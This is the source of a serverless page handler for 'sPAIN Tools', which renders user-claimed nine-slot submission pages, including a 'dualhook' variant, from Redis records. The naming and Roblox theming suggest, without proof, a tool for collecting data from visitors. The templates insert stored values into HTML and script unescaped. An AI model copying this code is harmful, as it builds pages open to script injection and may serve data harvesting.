// api/page.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

function build404() {
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Not Found — sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500&display=swap" rel="stylesheet">
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#080810;color:#f0f0f8;font-family:'Inter',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;}h1{font-family:'Orbitron',sans-serif;font-size:clamp(3rem,10vw,7rem);font-weight:900;background:linear-gradient(135deg,#f0abfc,#c026d3,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:16px;}p{color:#5a5a78;font-size:1rem;margin-bottom:32px;}a{background:linear-gradient(135deg,#c026d3,#a855f7);color:#fff;padding:14px 32px;border-radius:10px;text-decoration:none;font-weight:600;box-shadow:0 0 30px rgba(192,38,211,0.4);}</style>
</head><body><h1>404</h1><p>This page hasn't been claimed yet — or doesn't exist.</p><a href="/">Go to sPAIN Tools</a></body></html>`;
}

// ── SLOTS PAGE (plain 1-9 submit form) ───────────────────────────────────────
function buildSlotsPage(record) {
  const img = record.charUrl || 'https://tr.rbxcdn.com/30DAY-Avatar-D7AA065464297A80748737C0DCD67BB4-Png/720/720/Avatar/Webp/noFilter';
  let slotFields = '';
  for (let i = 1; i <= 9; i++) {
    slotFields += `<div class="input-group"><label class="input-label">Slot ${i}</label><input class="field-input" type="text" id="slot${i}" placeholder="Enter slot ${i} value..."></div>`;
  }
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>${record.displayName}</title>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
<style>
:root{--bg:#080810;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78;--card:#0d0d1a;}
*{margin:0;padding:0;box-sizing:border-box;}
body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;overflow-x:hidden;}
.aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
.aurora-blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12;animation:drift 12s ease-in-out infinite alternate;}
.aurora-blob:nth-child(1){width:700px;height:700px;background:var(--accent);top:-150px;left:-150px;animation-duration:14s;}
.aurora-blob:nth-child(2){width:500px;height:500px;background:var(--accent2);bottom:-100px;right:-80px;animation-duration:18s;animation-delay:-5s;}
@keyframes drift{from{transform:translate(0,0) scale(1)}to{transform:translate(60px,40px) scale(1.1)}}
.bg-grid{position:fixed;inset:0;background-image:linear-gradient(rgba(192,38,211,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(192,38,211,0.04) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0;mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 20%,transparent 100%);}
#particles{position:fixed;inset:0;z-index:1;pointer-events:none;}
.card{position:relative;z-index:3;background:var(--card);border:1px solid rgba(192,38,211,0.2);border-radius:24px;padding:44px 48px 48px;width:100%;max-width:580px;box-shadow:0 0 80px rgba(192,38,211,0.1),0 30px 80px rgba(0,0,0,0.5);overflow:hidden;}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));}
.avatar-wrap{display:flex;justify-content:center;margin-bottom:22px;}
.avatar-wrap img{width:90px;height:90px;object-fit:contain;border-radius:50%;border:2px solid rgba(192,38,211,0.3);box-shadow:0 0 30px rgba(192,38,211,0.4);}
.page-badge{display:inline-flex;align-items:center;gap:7px;background:rgba(192,38,211,0.1);border:1px solid rgba(192,38,211,0.28);border-radius:100px;padding:6px 16px;font-size:0.68rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:#e879f9;margin-bottom:14px;}
.page-badge::before{content:'';width:5px;height:5px;background:#e879f9;border-radius:50%;box-shadow:0 0 8px #e879f9;animation:blink 1.5s infinite;}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
.page-title{font-family:'Orbitron',sans-serif;font-size:clamp(1.4rem,4vw,2rem);font-weight:900;letter-spacing:-0.02em;margin-bottom:6px;background:linear-gradient(135deg,#f0abfc,#c026d3,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
.page-sub{color:var(--muted);font-size:0.88rem;margin-bottom:30px;line-height:1.6;}
.input-group{margin-bottom:14px;}
.input-label{display:block;font-size:0.68rem;font-weight:600;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;}
.field-input{width:100%;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:10px;padding:11px 14px;color:var(--text);font-family:'Inter',sans-serif;font-size:0.88rem;outline:none;transition:border-color 0.2s,box-shadow 0.2s;}
.field-input::placeholder{color:rgba(90,90,120,0.6);}
.field-input:focus{border-color:rgba(192,38,211,0.45);box-shadow:0 0 0 3px rgba(192,38,211,0.09);}
.slots-divider{border:none;height:1px;background:linear-gradient(90deg,transparent,rgba(192,38,211,0.2),transparent);margin:20px 0;}
.submit-btn{width:100%;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;padding:16px 0;border-radius:12px;font-family:'Rajdhani',sans-serif;font-size:1.08rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;box-shadow:0 0 36px rgba(192,38,211,0.4);transition:transform 0.2s,box-shadow 0.2s,opacity 0.2s;margin-top:10px;}
.submit-btn:hover{transform:translateY(-2px);box-shadow:0 0 56px rgba(192,38,211,0.65);}
.submit-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;}
.status-msg{text-align:center;font-family:'Orbitron',sans-serif;font-size:0.7rem;letter-spacing:0.08em;min-height:22px;margin-top:14px;}
.powered{position:relative;z-index:3;margin-top:22px;font-size:0.7rem;color:var(--muted);letter-spacing:0.08em;}
.powered span{color:var(--accent);font-weight:600;}
</style>
</head>
<body>
<div class="aurora"><div class="aurora-blob"></div><div class="aurora-blob"></div></div>
<div class="bg-grid"></div>
<canvas id="particles"></canvas>
<div class="card">
  <div class="avatar-wrap"><img src="${img}" alt="avatar" onerror="this.style.display='none'"></div>
  <div class="page-badge">Slots 1–9 • ${record.slug}</div>
  <div class="page-title">${record.displayName}</div>
  <div class="page-sub">Fill in the slots below and hit submit.</div>
  <hr class="slots-divider">
  ${slotFields}
  <button class="submit-btn" id="submitBtn" onclick="handleSubmit()">Submit Slots</button>
  <div class="status-msg" id="statusMsg"></div>
</div>
<div class="powered">Powered by <span>sPAIN Tools</span></div>
<script>
const SLUG='${record.slug}';
function setStatus(msg,color){const el=document.getElementById('statusMsg');el.textContent=msg;el.style.color=color||'#5a5a78';}
async function handleSubmit(){
  const btn=document.getElementById('submitBtn');
  const slots={};
  for(let i=1;i<=9;i++) slots['slot'+i]=document.getElementById('slot'+i).value.trim();
  if(!Object.values(slots).some(v=>v.length>0)){setStatus('⚠ Fill in at least one slot.','#e879f9');return;}
  btn.disabled=true;btn.textContent='Submitting…';
  try{
    const res=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug:SLUG,slots})});
    const data=await res.json();
    if(data.success){btn.textContent='✓ Submitted!';btn.style.background='linear-gradient(135deg,#16a34a,#22c55e)';btn.style.boxShadow='0 0 36px rgba(34,197,94,0.4)';setStatus('✓ Submitted successfully.','#4ade80');for(let i=1;i<=9;i++)document.getElementById('slot'+i).value='';}
    else{setStatus('✗ '+(data.error||'Error.'),'#f472b6');btn.disabled=false;btn.textContent='Submit Slots';}
  }catch{setStatus('✗ Network error.','#f472b6');btn.disabled=false;btn.textContent='Submit Slots';}
}
(function(){const canvas=document.getElementById('particles');const ctx=canvas.getContext('2d');let W,H,particles=[];function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight;}resize();window.addEventListener('resize',resize);const COLORS=['rgba(192,38,211,','rgba(168,85,247,','rgba(6,182,212,','rgba(232,121,249,'];class Particle{constructor(){this.x=Math.random()*W;this.y=Math.random()*H;this.vx=(Math.random()-0.5)*0.3;this.vy=(Math.random()-0.5)*0.3-0.1;this.r=Math.random()*1.5+0.3;this.alpha=Math.random()*0.5+0.1;this.color=COLORS[Math.floor(Math.random()*COLORS.length)];this.life=0;this.maxLife=200+Math.random()*300;}update(){this.x+=this.vx;this.y+=this.vy;this.life++;if(this.life>this.maxLife||this.x<0||this.x>W||this.y<0||this.y>H){Object.assign(this,new Particle());this.life=0;}}draw(){const fade=this.life<30?this.life/30:this.life>this.maxLife-30?(this.maxLife-this.life)/30:1;ctx.beginPath();ctx.arc(this.x,this.y,this.r,0,Math.PI*2);ctx.fillStyle=this.color+(this.alpha*fade)+')';ctx.fill();}}for(let i=0;i<60;i++)particles.push(new Particle());function loop(){ctx.clearRect(0,0,W,H);particles.forEach(p=>{p.update();p.draw();});requestAnimationFrame(loop);}loop();})();
<\/script>
</body></html>`;
}

// ── DUALHOOK PAGE (simple card — exact match of INDEX_1-9_generator_dualhooked.HTML) ─
function buildDualhookPage(record) {
  const img = record.charUrl || '';
  const slug = record.slug;
  const displayName = record.displayName || slug;

  let slotFields = '';
  for (let i = 1; i <= 9; i++) {
    slotFields += `<div class="input-group"><label class="input-label">Slot ${i}</label><input class="field-input" type="text" id="slot${i}" placeholder="Enter slot ${i} value..."></div>`;
  }

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${displayName}</title>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root { --bg:#080810; --surface:#0f0f18; --accent:#c026d3; --accent2:#a855f7; --accent3:#06b6d4; --accent-glow:rgba(192,38,211,0.4); --text:#f0f0f8; --muted:#5a5a78; --card:#0d0d1a; --border:rgba(255,255,255,0.06); }
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:var(--bg); color:var(--text); font-family:'Inter',sans-serif; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; overflow-x:hidden; }
  body::after { content:''; position:fixed; inset:0; background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E"); pointer-events:none; z-index:9998; opacity:0.5; }
  .bg-grid { position:fixed; inset:0; background-image:linear-gradient(rgba(192,38,211,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(192,38,211,0.04) 1px,transparent 1px); background-size:60px 60px; pointer-events:none; z-index:0; mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 20%,transparent 100%); }
  .aurora { position:fixed; inset:0; pointer-events:none; z-index:0; overflow:hidden; }
  .aurora-blob { position:absolute; border-radius:50%; filter:blur(100px); opacity:0.12; animation:drift 12s ease-in-out infinite alternate; }
  .aurora-blob:nth-child(1) { width:700px; height:700px; background:var(--accent); top:-150px; left:-150px; animation-duration:14s; }
  .aurora-blob:nth-child(2) { width:500px; height:500px; background:var(--accent2); bottom:-100px; right:-80px; animation-duration:18s; animation-delay:-5s; }
  @keyframes drift { from{transform:translate(0,0) scale(1)} to{transform:translate(60px,40px) scale(1.1)} }
  #particles { position:fixed; inset:0; z-index:1; pointer-events:none; }
  .card { position:relative; z-index:3; background:var(--card); border:1px solid rgba(192,38,211,0.2); border-radius:24px; padding:44px 48px 48px; width:100%; max-width:580px; box-shadow:0 0 80px rgba(192,38,211,0.1),0 30px 80px rgba(0,0,0,0.5); overflow:hidden; }
  .card::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3)); }
  .avatar-wrap { display:flex; justify-content:center; margin-bottom:22px; }
  .avatar-wrap img { width:90px; height:90px; object-fit:contain; border-radius:50%; border:2px solid rgba(192,38,211,0.3); box-shadow:0 0 30px rgba(192,38,211,0.4); }
  .page-badge { display:inline-flex; align-items:center; gap:7px; background:rgba(192,38,211,0.1); border:1px solid rgba(192,38,211,0.28); border-radius:100px; padding:6px 16px; font-size:0.68rem; font-weight:700; letter-spacing:0.12em; text-transform:uppercase; color:#e879f9; margin-bottom:14px; }
  .page-badge::before { content:''; width:5px; height:5px; background:#e879f9; border-radius:50%; box-shadow:0 0 8px #e879f9; animation:blink 1.5s infinite; }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
  .page-title { font-family:'Orbitron',sans-serif; font-size:clamp(1.4rem,4vw,2rem); font-weight:900; letter-spacing:-0.02em; margin-bottom:6px; background:linear-gradient(135deg,#f0abfc,#c026d3,#a855f7); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; }
  .page-sub { color:var(--muted); font-size:0.88rem; margin-bottom:30px; line-height:1.6; }
  .input-group { margin-bottom:14px; }
  .input-label { display:block; font-size:0.68rem; font-weight:600; letter-spacing:0.12em; text-transform:uppercase; color:var(--muted); margin-bottom:8px; }
  .field-input { width:100%; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07); border-radius:10px; padding:11px 14px; color:var(--text); font-family:'Inter',sans-serif; font-size:0.88rem; outline:none; transition:border-color 0.2s,box-shadow 0.2s; }
  .field-input::placeholder { color:rgba(90,90,120,0.6); }
  .field-input:focus { border-color:rgba(192,38,211,0.45); box-shadow:0 0 0 3px rgba(192,38,211,0.09); }
  .slots-divider { border:none; height:1px; background:linear-gradient(90deg,transparent,rgba(192,38,211,0.2),transparent); margin:20px 0; }
  .submit-btn { width:100%; background:linear-gradient(135deg,var(--accent),var(--accent2)); color:#fff; border:none; padding:16px 0; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.08rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer; box-shadow:0 0 36px rgba(192,38,211,0.4); transition:transform 0.2s,box-shadow 0.2s,opacity 0.2s; margin-top:10px; }
  .submit-btn:hover { transform:translateY(-2px); box-shadow:0 0 56px rgba(192,38,211,0.65); }
  .submit-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
  .status-msg { text-align:center; font-family:'Orbitron',sans-serif; font-size:0.7rem; letter-spacing:0.08em; min-height:22px; margin-top:14px; }
  .powered { position:relative; z-index:3; margin-top:22px; font-size:0.7rem; color:var(--muted); letter-spacing:0.08em; }
  .powered span { color:var(--accent); font-weight:600; }
</style>
</head>
<body>
<div class="aurora"><div class="aurora-blob"></div><div class="aurora-blob"></div></div>
<div class="bg-grid"></div>
<canvas id="particles"></canvas>
<div class="card">
  ${img ? `<div class="avatar-wrap"><img src="${img}" alt="avatar" onerror="this.parentElement.style.display='none'"></div>` : ''}
  <div class="page-badge">Slots 1–9 • ${slug}</div>
  <div class="page-title">${displayName}</div>
  <div class="page-sub">Fill in the slots below and hit submit.</div>
  <hr class="slots-divider">
  ${slotFields}
  <button class="submit-btn" id="submitBtn" onclick="handleSubmit()">Submit Slots</button>
  <div class="status-msg" id="statusMsg"></div>
</div>
<div class="powered">Powered by <span>sPAIN Tools</span></div>
<script>
const SLUG = '${slug}';
function setStatus(msg, color){ const el=document.getElementById('statusMsg'); el.textContent=msg; el.style.color=color||'#5a5a78'; }
async function handleSubmit(){
  const btn=document.getElementById('submitBtn');
  const slots={};
  for(let i=1;i<=9;i++) slots['slot'+i]=document.getElementById('slot'+i).value.trim();
  if(!Object.values(slots).some(v=>v.length>0)){ setStatus('⚠ Fill in at least one slot.','#e879f9'); return; }
  btn.disabled=true; btn.textContent='Submitting…';
  try{
    const res=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug:SLUG,slots})});
    const data=await res.json();
    if(data.success){
      btn.textContent='✓ Submitted!'; btn.style.background='linear-gradient(135deg,#16a34a,#22c55e)'; btn.style.boxShadow='0 0 36px rgba(34,197,94,0.4)';
      setStatus('✓ Submitted successfully.','#4ade80');
      for(let i=1;i<=9;i++) document.getElementById('slot'+i).value='';
    } else { setStatus('✗ '+(data.error||'Error.'),'#f472b6'); btn.disabled=false; btn.textContent='Submit Slots'; }
  } catch { setStatus('✗ Network error.','#f472b6'); btn.disabled=false; btn.textContent='Submit Slots'; }
}
(function(){ const canvas=document.getElementById('particles'); const ctx=canvas.getContext('2d'); let W,H,particles=[]; function resize(){ W=canvas.width=window.innerWidth; H=canvas.height=window.innerHeight; } resize(); window.addEventListener('resize',resize); const COLORS=['rgba(192,38,211,','rgba(168,85,247,','rgba(6,182,212,','rgba(232,121,249,']; class Particle{ constructor(){ this.x=Math.random()*W; this.y=Math.random()*H; this.vx=(Math.random()-0.5)*0.3; this.vy=(Math.random()-0.5)*0.3-0.1; this.r=Math.random()*1.5+0.3; this.alpha=Math.random()*0.5+0.1; this.color=COLORS[Math.floor(Math.random()*COLORS.length)]; this.life=0; this.maxLife=200+Math.random()*300; } update(){ this.x+=this.vx; this.y+=this.vy; this.life++; if(this.life>this.maxLife||this.x<0||this.x>W||this.y<0||this.y>H){Object.assign(this,new Particle());this.life=0;} } draw(){ const fade=this.life<30?this.life/30:this.life>this.maxLife-30?(this.maxLife-this.life)/30:1; ctx.beginPath(); ctx.arc(this.x,this.y,this.r,0,Math.PI*2); ctx.fillStyle=this.color+(this.alpha*fade)+')'; ctx.fill(); } } for(let i=0;i<60;i++) particles.push(new Particle()); function loop(){ ctx.clearRect(0,0,W,H); particles.forEach(p=>{p.update();p.draw();}); requestAnimationFrame(loop); } loop(); })();
<\/script>
</body>
</html>`;
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  const path = (req.url || '/').split('?')[0];
  const slug = path.replace(/^\//, '').split('/')[0].toLowerCase();

  if (!slug || slug === 'api' || slug === 'favicon.ico' || slug === 'index.html') {
    res.setHeader('Location', '/');
    return res.status(302).end();
  }

  let record;
  try { record = await redisGet(`slot:${slug}`); } catch (err) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(500).send(`<h1>Redis error: ${err.message}</h1>`);
  }

  if (!record) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(404).send(build404());
  }

  record.slug = slug;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  return res.status(200).send(
    record.type === 'dualhook' ? buildDualhookPage(record) : buildSlotsPage(record)
  );
}
